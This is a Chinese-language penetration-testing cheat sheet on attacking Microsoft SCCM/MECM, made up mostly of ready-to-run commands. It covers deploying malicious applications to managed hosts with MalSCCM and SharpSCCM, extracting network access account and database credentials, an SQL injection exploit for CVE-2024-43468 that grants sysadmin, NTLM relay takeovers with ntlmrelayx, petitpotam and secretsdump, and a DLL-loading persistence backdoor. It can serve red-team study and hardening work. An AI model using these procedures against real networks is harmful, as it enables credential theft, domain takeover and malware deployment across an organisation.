# 部署 - SCCM

> SCCM 是微软的一款解决方案，旨在以可扩展的方式增强整个组织的管理。

## SCCM 应用程序部署

> 应用程序部署是将软件应用程序打包并分发到组织内选定计算机或设备的过程

**工具**：

* [PowerShellMafia/PowerSCCM - 与 SCCM 部署交互的 PowerShell 模块](https://github.com/PowerShellMafia/PowerSCCM)
* [nettitude/MalSCCM - 滥用本地或远程 SCCM 服务器向其管理的主机部署恶意应用程序](https://github.com/nettitude/MalSCCM)

**利用方法**：

* 使用 **SharpSCCM**

  ```ps1
  .\SharpSCCM.exe get devices --server <SERVER8NAME> --site-code <SITE_CODE>
  .\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
  .\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
  ```

* 入侵客户端，使用 locate 找到管理服务器

    ```ps1
    MalSCCM.exe locate
    ```

* 以分发点管理员身份通过 WMI 枚举

    ```ps1
    MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
    ```

* 入侵管理服务器，使用 locate 找到主服务器
* 在主服务器上使用 `inspect` 查看可以定向的目标

    ```ps1
    MalSCCM.exe inspect /all
    MalSCCM.exe inspect /computers
    MalSCCM.exe inspect /primaryusers
    MalSCCM.exe inspect /groups
    ```

* 为你想要横向移动的机器创建新的设备组

    ```ps1
    MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
    MalSCCM.exe inspect /groups
    ```

* 将目标添加到新组中

    ```ps1
    MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
    ```

* 创建指向全局可读共享上恶意 EXE 的应用程序：`SCCMContentLib$`

    ```ps1
    MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
    MalSCCM.exe inspect /applications
    ```

* 将应用程序部署到目标组

    ```ps1
    MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
    MalSCCM.exe inspect /deployments
    ```

* 强制目标组检查更新

    ```ps1
    MalSCCM.exe checkin /groupname:TargetGroup
    ```

* 清理应用程序、部署和组

    ```ps1
    MalSCCM.exe app /cleanup /name:demoapp
    MalSCCM.exe group /delete /groupname:TargetGroup
    ```

## SCCM 枚举

* [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter) - SCCMHunter 是一款后渗透工具，用于简化在 Active Directory 域中对 SCCM 相关资产的识别、分析和攻击。

    ```ps1
    sccmhunter.py find -u user -p P@ssw0rd -dc-ip 10.10.10.10 -d lab.lan
    sccmhunter.py show -siteservers
    ```

## SCCM 共享

> 查找存储在 (System Center) Configuration Manager (SCCM/CM) SMB 共享上的有趣文件

* [1njected/CMLoot](https://github.com/1njected/CMLoot)

  ```ps1
  Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
  Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
  Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
  ```

## SCCM 配置管理器

* [subat0mik/Misconfiguration-Manager/MisconfigurationManager.ps1](https://github.com/subat0mik/Misconfiguration-Manager) - Misconfiguration Manager 是所有已知 Microsoft Configuration Manager 攻击手法及相关防御加固指南的中央知识库。

### CRED-1 通过 PXE 启动介质获取凭据

* [Misconfiguration-Manager - CRED-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md)

**前提条件**：

* SCCM 分发点上：`HKLM\Software\Microsoft\SMS\DP\PxeInstalled` = 1
* SCCM 分发点上：`HKLM\Software\Microsoft\SMS\DP\IsPxe` = 1
* 启用 PXE 的分发点

**利用方法**：

* [csandker/pxethiefy](https://github.com/csandker/pxethiefy)

    ```ps1
    sudo python3 pxethiefy.py explore -i eth0
    ```

* [MWR-CyberSec/PXEThief](https://github.com/MWR-CyberSec/PXEThief)

### CRED-2 请求包含凭据的策略

* [Misconfiguration-Manager - CRED-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md)

**前提条件**：

* 不需要 PKI 证书进行客户端身份验证
* 域帐户凭据

**利用方法**：

创建一台机器或入侵现有机器，然后请求如 `NAAConfig` 等策略

使用 `SharpSCCM` 的简单模式

```ps1
addcomputer.py -computer-name 'attacker$' -computer-pass P@ssw0rd -dc-ip 10.10.10.10 lab.lan/user:'P@ssw0rd'
SharpSCCM.exe get naa -r newdevice -u attacker$ -p P@ssw0rd
SharpSCCM get naa
SharpSCCM get secrets -u <username-machine-$> -p <password>
```

通过创建机器的隐蔽模式。

* 使用特定密码创建机器帐户：`addcomputer.py -computer-name 'customsccm$' -computer-pass 'YourStrongPassword123*' 'sccm.lab/carol:SCCMftw' -dc-ip 192.168.33.10`
* 在 `/etc/hosts` 文件中为 MECM 服务器添加条目：`192.168.33.11 MECM MECM.SCCM.LAB`
* 使用 `sccmwtf` 请求策略：`python3 sccmwtf.py fake fakepc.sccm.lab MECM 'SCCMLAB\customsccm$' 'YourStrongPassword123*'`
* 解析策略以提取凭据并使用 [sccmwtf/policysecretunobfuscate.py](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py) 解密：`cat /tmp/naapolicy.xml |grep 'NetworkAccessUsername\|NetworkAccessPassword' -A 5 |grep -e 'CDATA' | cut -d '[' -f 3|cut -d ']' -f 1| xargs -I {} python3 policysecretunobfuscate.py {}`

### CRED-3 提取当前部署的以 DPAPI blob 存储的凭据

> 通过 WMI 导出当前部署的密钥。如果你能在作为 SCCM 客户端的主机上提权，则可以获取明文域凭据。

* [Misconfiguration-Manager - CRED-3](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-3/cred-3_description.md)

**前提条件**：

* SCCM 客户端上的本地管理员权限

**利用方法**：

* 查找 SCCM blob

    ```ps1
    Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
    NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
    NetworkAccessUsername : <![CDATA[E600000001...00F92]]>
    ```

* 使用 [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244)

    ```ps1
    $str = "060...F2DAF"
    $bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++}
    $b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
    .\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt    
    ```

* 使用 [Mayyhem/SharpSCCM](https://github.com/Mayyhem/SharpSCCM) 进行 SCCM 获取和解密

    ```ps1
    .\SharpSCCM.exe local secrets -m wmi
    ```

从远程机器操作。

* 使用 [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)

    ```ps1
    python3 ./sccmhunter.py http -u "administrator" -p "P@ssw0rd" -d internal.lab -dc-ip 10.10.10.10. -auto
    ```

### CRED-4 提取以 DPAPI blob 存储的遗留凭据

* [Misconfiguration-Manager - CRED-4](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-4/cred-4_description.md)

**前提条件**：

* SCCM 客户端上的本地管理员权限

**利用方法**：

* 使用 `SharpDPAPI` 搜索数据库

    ```ps1
    .\SharpDPAPI.exe search /type:file /path:C:\Windows\System32\wbem\Repository\OBJECTS.DATA
    ```

* 使用 `SharpSCCM` 搜索数据库

    ```ps1
    .\SharpSCCM.exe local secrets -m disk
    ```

* 检查位于 `C:\Windows\System32\wbem\Repository\OBJECTS.DATA` 的 CIM 存储库的 ACL：

    ```ps1
    Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
    ConvertFrom-SddlString ""
    ```

### CRED-5 从站点数据库提取 SC_UserAccount 表

* [Misconfiguration-Manager - CRED-5](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-5/cred-5_description.md)

**前提条件**：

* 站点数据库访问权限
* 主站点服务器访问权限
    * 访问用于加密的私钥

**利用方法**：

* [gentilkiwi/mimikatz](https://twitter.com/gentilkiwi/status/1392204021461569537)

    ```ps1
    mimikatz # misc::sccm /connectionstring:"DRIVER={SQL Server};Trusted=true;DATABASE=ConfigMgr_CHQ;SERVER=CM1;"
    ```

* [skahwah/SQLRecon](https://github.com/skahwah/SQLRecon)，仅当站点服务器和数据库托管在同一系统上时

    ```ps1
    SQLRecon.exe /auth:WinToken /host:CM1 /database:ConfigMgr_CHQ /module:sDecryptCredentials
    ```

* SQLRecon + [xpn/sccmdecryptpoc.cs](https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1)

    ```ps1
    SQLRecon.exe /auth:WinToken /host:<SITE-DB> /database:CM_<SITECODE> /module:query /command:"SELECT * FROM SC_UserAccount"
    sccmdecryptpoc.exe 0C010000080[...]5D6F0
    ```

### 未认证 SQL 注入 - CVE-2024-43468

* [synacktiv/CVE-2024-43468](https://github.com/synacktiv/CVE-2024-43468) - Microsoft Configuration Manager (ConfigMgr / SCCM) 2403 未认证 SQL 注入漏洞（CVE-2024-43468）利用

```ps1
$ CVE-2024-43468.py -t cmc.corp.local -sql "create login [CORP\user1] from windows ; exec master.dbo.sp_addsrvrolemember [CORP\user1], 'sysadmin'"
$ mssqlclient.py -debug -windows-auth 'CORP/user1:xxx'@cmc-db.corp.local
SQL> select name from sysdatabases where name like 'CM_%'
```

## SCCM 中继

### TAKEOVER1 - 低权限到数据库管理员 - MSSQL 中继

**前提条件**：

* 数据库与站点服务器分离
* 站点服务器是数据库的 sysadmin

**利用方法**：

* 生成提升用户权限的查询：

    ```ps1
    python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug -tu carol -sc P01 -stacked
    ```

* 使用生成的查询设置中继：

    ```ps1
    ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"
    ```

* 使用域帐户强制认证到你的监听器：

    ```ps1
    petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11
    ```

* 最后以管理员身份连接 MSSQL 服务器：

    ```ps1
    python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11
    ```

### TAKEOVER2 - 低权限到 MECM 管理员帐户 - SMB 中继

微软要求站点服务器的计算机帐户是 MSSQL 服务器上的管理员。

**利用方法**：

* 为 MSSQL 服务器启动监听器：`ntlmrelayx -t 192.168.33.12 -smb2support -socks`
* 使用域凭据（在同一机器上获取的低权限 SCCM NAA 效果很好）从站点服务器强制认证：`petitpotam.py -d sccm.lab -u sccm-naa -p 123456789 192.168.33.1 192.168.33.11`
* 最后使用 `ntlmrelayx` 的 SOCKS 以本地管理员身份访问 MSSQL 服务器

    ```ps1
    proxychains -q smbexec.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 
    proxychains -q secretsdump.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 
    ```

### ELEVATE 2 - 通过自动客户端推送认证进行 NTLM 中继

**前提条件**：

* 启用自动站点范围客户端推送安装
* 自动站点设备批准
* 回退到 NTLM 认证

**利用方法**：

```ps1
SharpSCCM.exe invoke client-push -t 192.168.1.50
ntlmrelayx.py -t mssql01.lab.lan -smb2support
```

## SCCM 持久化

* [mandiant/CcmPwn](https://github.com/mandiant/CcmPwn) - 利用 CcmExec 服务远程劫持用户会话的横向移动脚本。

CcmExec 是 SCCM Windows 客户端原生的一项服务，在每个交互式会话中执行。此技术需要目标机器上的管理员权限。

* 在 `SCNotification.exe.config` 中植入后门以加载你的 DLL

    ```ps1
    python3 ccmpwn.py domain/user:password@workstation.domain.local exec -dll evil.dll -config exploit.config
    ```

* 恶意配置强制 `SCNotification.exe` 从攻击者控制的文件共享加载文件

    ```ps1
    python3 ccmpwn.py domain/user:password@workstation.domain.local coerce -computer 10.10.10.10
    ```

## 参考资料

* [Attacking and Defending Configuration Manager - An Attackers Easy Win - Logan Goins - April 25, 2025](https://logan-goins.com/2025-04-25-sccm/)
* [Decrypting the Forest From the Trees - Garrett Foster - March 6, 2025](https://specterops.io/blog/2025/03/06/decrypting-the-forest-from-the-trees/)
* [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - May 13, 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
* [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - July 9, 2022](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
* [Further Adventures With CMPivot — Client Coercion - Diego Lomellini - February 3, 2025](https://posts.specterops.io/further-adventures-with-cmpivot-client-coercion-38b878b740ac)
* [Introducing ConfigManBearPig, a BloodHound OpenGraph Collector for SCCM - Chris Thompson - January 13, 2026](https://specterops.io/blog/2026/01/13/introducing-configmanbearpig-a-bloodhound-opengraph-collector-for-sccm/)
* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
* [Misconfiguration Manager: Overlooked and Overprivileged - Duane Michael - March 5, 2024](https://posts.specterops.io/misconfiguration-manager-overlooked-and-overprivileged-70983b8f350d)
* [Network Access Accounts are evil… - Roger Zander - September 13, 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
* [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - June 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
* [SCCM / MECM LAB - Part 0x0 - mayfly - March 23, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x0/)
* [SCCM / MECM LAB - Part 0x1 - Recon and PXE - mayfly - March 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x1/)
* [SCCM / MECM LAB - Part 0x2 - Low user - mayfly - March 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x2/)
* [SCCM / MECM LAB - Part 0x3 - Admin User - mayfly - April 3, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x3/)
* [SeeSeeYouExec: Windows Session Hijacking via CcmExec - Andrew Oliveau - March 28, 2024](https://cloud.google.com/blog/topics/threat-intelligence/windows-session-hijacking-via-ccmexec?hl=en)
* [The Phantom Credentials of SCCM: Why the NAA Won't Die - Duane Michael - June 28, 2022](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
